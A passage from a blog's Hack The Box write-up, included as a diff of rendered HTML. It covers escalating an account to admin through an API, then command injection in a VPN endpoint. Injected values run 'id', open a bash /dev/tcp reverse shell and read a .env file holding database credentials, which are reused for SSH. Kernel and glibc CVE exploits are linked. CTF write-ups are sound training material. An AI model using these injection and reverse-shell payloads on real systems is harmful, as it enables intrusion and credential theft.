+<span class="giallo-l"><span class="z-3">        &quot;</span><span class="z-9">is_admin</span><span class="z-3">&quot;:</span><span class="z-10"> 1</span><span class="z-3">,</span></span>
+<span class="giallo-l"><span class="z-3">        &quot;</span><span class="z-9">email</span><span class="z-3">&quot;: &quot;</span><span class="z-6">test123@gmail.com</span><span class="z-3">&quot;</span></span>
+<span class="giallo-l"><span class="z-3">    },</span></span>
+<span class="giallo-l"><span class="z-9">    url</span><span class="z-3">: &#39;</span><span class="z-6">/api/v1/admin/settings/update</span><span class="z-3">&#39;,</span></span>
+<span class="giallo-l"><span class="z-2">    success</span><span class="z-3">:</span><span class="z-7"> function</span><span class="z-3">(</span><span class=" z-i">response</span><span class="z-3">) {</span></span>
+<span class="giallo-l"><span>        console</span><span class="z-3">.</span><span class="z-2">log</span><span class="z-9">(</span><span>response</span><span class="z-9">)</span></span>
+<span class="giallo-l"><span class="z-3">    },</span></span>
+<span class="giallo-l"><span class="z-2">    error</span><span class="z-3">:</span><span class="z-7"> function</span><span class="z-3">(</span><span class=" z-i">response</span><span class="z-3">) {</span></span>
+<span class="giallo-l"><span>        console</span><span class="z-3">.</span><span class="z-2">log</span><span class="z-9">(</span><span>response</span><span class="z-9">)</span></span>
+<span class="giallo-l"><span class="z-3">    }</span></span>
+<span class="giallo-l"><span class="z-3">}</span><span>)</span></span></code></pre>
+<p>Therefore, I switched to Postman to send the PUT request with Cookie ("PHPSESSID") being set correctly, which successfully modified our account to admin role. Then, we can start playing with <code>/api/v1/admin/vpn/generate</code> endpoint, which actually allows us to execute arbitrary commands.</p>
+<pre class="giallo z-code" data-lang="json"><code data-lang="json"><span class="giallo-l"><span class="z-3">{</span></span>
+<span class="giallo-l"><span class="z-3">    &quot;</span><span class="z-7">username</span><span class="z-3">&quot;: &quot;</span><span class="z-6">test123; id #</span><span class="z-3">&quot;</span></span>
+<span class="giallo-l"><span class="z-3">}</span></span></code></pre>
+<p>Response is as below:</p>
+<pre class="giallo z-code" data-lang="plain"><code data-lang="plain"><span class="giallo-l"><span>uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></span></code></pre><h3 id="reverse-shell"><a class="zola-anchor" href="#reverse-shell" aria-label="Link to this section">#</a>
+Reverse Shell</h3>
+<p>Ok, we can create a reverse shell right now. I originally tried to use <code>nc -e /bin/bash</code> for this goal. Unfortunately, <code>nc</code> on the target machine does not have <code>-e</code> option. Therefore, we use <code>/dev/tcp</code> this time as below:</p>
+<pre class="giallo z-code" data-lang="json"><code data-lang="json"><span class="giallo-l"><span class="z-3">{</span></span>
+<span class="giallo-l"><span class="z-3">    &quot;</span><span class="z-7">username</span><span class="z-3">&quot;: &quot;</span><span class="z-6">test123; bash -c &#39;bash -i &gt;&amp; /dev/tcp/$myip/$myport 0&gt;&amp;1&#39; #</span><span class="z-3">&quot;</span></span>
+<span class="giallo-l"><span class="z-3">}</span></span></code></pre>
+<p>Prior to the reverse shell, remember to run <code>nc -lnvp $myport</code> on your local machine. With <code>admin</code> permission, it is easy to obtain the flag in the admin user's home directory.</p>
+<h3 id="ssh-into-the-box"><a class="zola-anchor" href="#ssh-into-the-box" aria-label="Link to this section">#</a>
+SSH into the Box</h3>
+<p>Since the port 22 is open, can we ssh into the box alternatively? We can try to print out an interesting file <code>/var/wwwhtml/.env</code></p>
+<pre class="giallo z-code" data-lang="json"><code data-lang="json"><span class="giallo-l"><span class="z-3">{</span></span>
+<span class="giallo-l"><span class="z-3">    &quot;</span><span class="z-7">username</span><span class="z-3">&quot;: &quot;</span><span class="z-6">test123; cat ~/html/.env #</span><span class="z-3">&quot;</span></span>
+<span class="giallo-l"><span class="z-3">}</span></span></code></pre>
+<p>Response:</p>
+<pre class="giallo z-code" data-lang="plain"><code data-lang="plain"><span class="giallo-l"><span>DB_HOST=127.0.0.1</span></span>
+<span class="giallo-l"><span>DB_DATABASE=htb_prod</span></span>
+<span class="giallo-l"><span>DB_USERNAME=admin</span></span>
+<span class="giallo-l"><span>DB_PASSWORD=SuperDuperPass123</span></span></code></pre>
+<p>Then, we can try to reuse the password and ssh into the box. It is easier to interact with the target machine using ssh.</p>
+<h2 id="cve-2023-0386"><a class="zola-anchor" href="#cve-2023-0386" aria-label="Link to this section">#</a>
+CVE-2023-0386</h2>
+<p>Please download the exploit PoC from <a rel="noopener external" target="_blank" href="https://github.com/xkaneiki/CVE-2023-0386">xkaneiki/CVE-2023-0386</a></p>
+<h2 id="cve-2023-4911"><a class="zola-anchor" href="#cve-2023-4911" aria-label="Link to this section">#</a>
+CVE-2023-4911</h2>
+<blockquote>
+<p><a rel="noopener external" target="_blank" href="https://github.com/leesh3288/CVE-2023-4911">leesh3288/CVE-2023-4911</a></p>
+</blockquote>
+<ul>
+<li>glibc 2.35</li>
+<li><code>GLIBC_TUNABLES</code></li>
+</ul>
+<p>(TBD)</p>
+<h2 id="references"><a class="zola-anchor" href="#references" aria-label="Link to this section">#</a>
+References</h2>
+<ul>
+<li><a rel="noopener external" target="_blank" href="https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386">The OverlayFS vulnerability CVE-2023-0386: Overview, detection, and remediation</a></li>
+<li><a rel="noopener external" target="_blank" href="https://github.com/xkaneiki/CVE-2023-0386">xkaneiki/CVE-2023-0386</a></li>
+<li><a rel="noopener external" target="_blank" href="https://github.com/leesh3288/CVE-2023-4911">leesh3288/CVE-2023-4911</a></li>
+</ul>
+
+    
+<nav class="site-prev-next" aria-label="More posts"><a href="https://shengtuo.me/blog/htb/cap/">← Older: Cap</a><a href="https://shengtuo.me/blog/htb/dog/">Newer: Dog →</a>
+</nav>
+
+  </article>
+</main>
+
+  <footer class="f-footer"><div class="f-footer__cats" aria-hidden="true"></div>
+  <ul class="f-social site-footer-social" aria-label="Elsewhere">
+    <li><a class="f-social__link" href="https://github.com/h1994st" rel="me noopener"><span class="f-icon f-icon--github" aria-hidden="true"></span><span class="f-visually-hidden">GitHub</span></a></li>
+    <li><a class="f-social__link" href="https://scholar.google.com/citations?user=VOefXMMAAAAJ" rel="me noopener"><span class="f-icon f-icon--google-scholar" aria-hidden="true"></span><span class="f-visually-hidden">Google Scholar</span></a></li>
+    <li><a class="f-social__link" href="https://www.linkedin.com/in/shengtuo/" rel="me noopener"><span class="f-icon f-icon--linkedin" aria-hidden="true"></span><span class="f-visually-hidden">LinkedIn</span></a></li>
+    <li><a class="f-social__link" href="https://x.com/ShengtuoHu" rel="me noopener"><span class="f-icon f-icon--x" aria-hidden="true"></span><span class="f-visually-hidden">X</span></a></li>
+    <li><a class="f-social__link" href="https://www.instagram.com/hst_nullderef/" rel="me noopener"><span class="f-icon f-icon--instagram" aria-hidden="true"></span><span class="f-visually-hidden">Instagram</span></a></li>
+  </ul>
+  <p class="site-footer-links"><a href="https://shengtuo.me/blog/">Blog</a> · <a href="https://shengtuo.me/notebook/">Notebook</a> · <a href="https://shengtuo.me/misc/">Misc.</a> · 
+    <a href="https://shengtuo.me/atom.xml">Feed</a>
+  </p>
+  <p>© 2026 Shengtuo Hu</p>
+</footer>
+
+  <dialog class="f-sheet" id="site-search" aria-label="Search" data-index="https://shengtuo.me/search_index.en.json">
+  <div class="f-sheet__panel">
+    <input class="f-input f-search" type="search" placeholder="Search posts and notes" aria-label="Search" autocomplete="off" />
+    <p class="f-meta site-search-status" role="status"></p>
+    <ol class="site-search-results"></ol>
+  </div>
+</dialog>
+<script type="module" src="https://shengtuo.me/js/site/search.js"></script>
+
+  
+  <script type="module" src="https://shengtuo.me/vendor/facet/dist/js/facet.js"></script>
+  <script type="module" src="https://shengtuo.me/js/site/cats.js"></script>
+  <script type="module" src="https://shengtuo.me/js/site/code-copy.js"></script><script type="module" src="https://shengtuo.me/js/site/share.js"></script>
+
+</body>
+</html>
